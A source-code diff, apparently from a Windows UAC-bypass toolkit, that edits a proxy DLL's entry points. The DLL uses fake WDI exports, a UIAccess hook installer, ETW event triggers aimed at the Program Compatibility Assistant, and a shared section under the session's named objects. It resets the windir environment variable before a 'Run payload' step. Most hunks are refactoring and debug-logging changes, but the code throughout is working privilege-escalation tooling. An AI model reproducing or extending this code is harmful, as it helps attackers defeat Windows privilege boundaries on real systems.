@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.56
 *
-*  DATE:        16 July 2021
+*  DATE:        17 July 2021
 *
 *  Proxy dll entry point.
 *
@@ -47,7 +47,7 @@ ULONG_PTR WINAPI WdiGetDiagnosticModuleInterfaceVersion(
 * Stub for fake WDI exports.
 *
 */
-ULONG_PTR WINAPI WdiStubGeneric(
+HRESULT WINAPI WdiStubGeneric(
     ULONG_PTR UnusedParam1,
     ULONG_PTR UnusedParam2
 )
@@ -56,7 +56,7 @@ ULONG_PTR WINAPI WdiStubGeneric(
     UNREFERENCED_PARAMETER(UnusedParam2);
 
     OutputDebugString(L"[PCASTUB] WdiStubGeneric called\r\n");
-    return 0;
+    return S_OK;
 }
 
 /*
@@ -180,7 +180,7 @@ VOID UiAccessMethodPayload(
     lpFileName = _filename(szModuleName);
     if (lpFileName == NULL)
         return;
-   
+
     if (fInstallHook) {
 
         //
@@ -303,8 +303,6 @@ ULONG pcaEtwCall()
     EVENT_DESCRIPTOR eventDescriptor;
     ULONG status = 0;
 
-    OutputDebugString(L"[PCALDR] pcaEtwCall\r\n");
-
     eventDescriptor.Id = 0x1F46;
     eventDescriptor.Version = 0;
     eventDescriptor.Channel = 0x11;
@@ -319,7 +317,7 @@ ULONG pcaEtwCall()
         3,
         (PEVENT_DATA_DESCRIPTOR)&eventUserData);
 
-    _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(1):");
+    _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(0x1F46):");
     ultohex(status, _strend(szDebug));
     _strcat(szDebug, TEXT("\r\n"));
     OutputDebugString(szDebug);
@@ -334,7 +332,7 @@ ULONG pcaEtwCall()
             3,
             (PEVENT_DATA_DESCRIPTOR)&eventUserData);
 
-        _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(2):");
+        _strcpy(szDebug, L"[PCALDR] EtwEventWriteNoRegistration(0x1F48):");
         ultohex(status, _strend(szDebug));
         _strcat(szDebug, TEXT("\r\n"));
         OutputDebugString(szDebug);
@@ -358,15 +356,13 @@ ULONG pcaStopWDI()
     NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
 
     OutputDebugString(L"[PCALDR] pcaStopWDI\r\n");
-    
-    hr = CoInitializeEx(NULL, 
-        COINIT_APARTMENTTHREADED | 
+
+    hr = CoInitializeEx(NULL,
+        COINIT_APARTMENTTHREADED |
         COINIT_DISABLE_OLE1DDE |
         COINIT_SPEED_OVER_MEMORY);
 
     if (SUCCEEDED(hr)) {
-
-        OutputDebugString(L"[PCALDR] CoInitializeEx success\r\n");
 
         ucmSleep(1000);
 
@@ -380,9 +376,6 @@ ULONG pcaStopWDI()
 
         CoUninitialize();
 
-    }
-    else {
-        OutputDebugString(L"[PCALDR] CoInitializeEx failed\r\n");
     }
 
     return ntStatus;
@@ -417,7 +410,7 @@ VOID WINAPI EntryPointExeModePCAMethod(
         _strcat(szDebug, szLoaderParam);
         _strcat(szDebug, L"\r\n");
         OutputDebugString(szDebug);
-        
+
         if (szLoaderParam[0] == TEXT('1')) {
             status = pcaEtwCall();
         }
@@ -428,14 +421,14 @@ VOID WINAPI EntryPointExeModePCAMethod(
     else {
         OutputDebugString(L"[PCALDR] Empty command line\r\n");
     }
-   
+
     RtlExitUserProcess(status);
 }
 
 typedef struct _PCA_LOADER_BLOCK {
     ULONG OpResult;
     WCHAR szLoader[MAX_PATH + 1];
-} PCA_LOADER_BLOCK, *PPCA_LOADER_BLOCK;
+} PCA_LOADER_BLOCK, * PPCA_LOADER_BLOCK;
 
 /*
 * EntryPointDllPCAMethod
@@ -463,7 +456,7 @@ BOOL WINAPI EntryPointDllPCAMethod(
     SIZE_T viewSize = PAGE_SIZE;
 
     HANDLE hSharedEvent = NULL;
-    WCHAR szObjectName[256];
+    WCHAR szObjectName[MAX_PATH];
     WCHAR szName[128];
     WCHAR szLoaderCmdLine[2];
     WCHAR szLoader[MAX_PATH + 1];
@@ -490,17 +483,24 @@ BOOL WINAPI EntryPointDllPCAMethod(
         RtlSecureZeroMemory(&szName, sizeof(szName));
         ucmGenerateSharedObjectName(FUBUKI_PCA_SECTION_ID, szName);
 
-        _strcpy(szDebug, L"[PCADLL] szName = ");
-        _strcat(szDebug, szName);
-        _strcat(szDebug, L" SessionId = ");
-        ultostr(NtCurrentPeb()->SessionId, _strend(szDebug));
-        _strcat(szDebug, L"\r\n");
+        _strcpy(szObjectName, TEXT("\\Sessions\\"));
+        ultostr(NtCurrentPeb()->SessionId, _strend(szObjectName));
+        _strcat(szObjectName, TEXT("\\BaseNamedObjects\\"));
+        _strcat(szObjectName, szName);
+
+        RtlInitUnicodeString(&usName, szObjectName);
+        InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+        _strcpy(szDebug, TEXT("[PCADLL] Shared section = "));
+        _strcat(szDebug, szObjectName);
+        _strcat(szDebug, TEXT("\r\n"));
         OutputDebugString(szDebug);
 
-        hSharedSection = OpenFileMapping(FILE_MAP_WRITE, FALSE, szName);
-        if (hSharedSection) {
-
-            OutputDebugString(L"[PCADLL] OpenFileMapping success\r\n");
+        if (NT_SUCCESS(NtOpenSection(&hSharedSection,
+            SECTION_ALL_ACCESS,
+            &obja)))
+        {
+            OutputDebugString(L"[PCADLL] Shared section open OK\r\n");
 
             ntStatus = NtMapViewOfSection(
                 hSharedSection,
@@ -552,7 +552,7 @@ BOOL WINAPI EntryPointDllPCAMethod(
                     //
                     // Reset windir environment variable.
                     //
-                    SetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);
+                    ucmSetEnvironmentVariable(T_WINDIR, USER_SHARED_DATA->NtSystemRoot);
 
                     //
                     // Run payload.
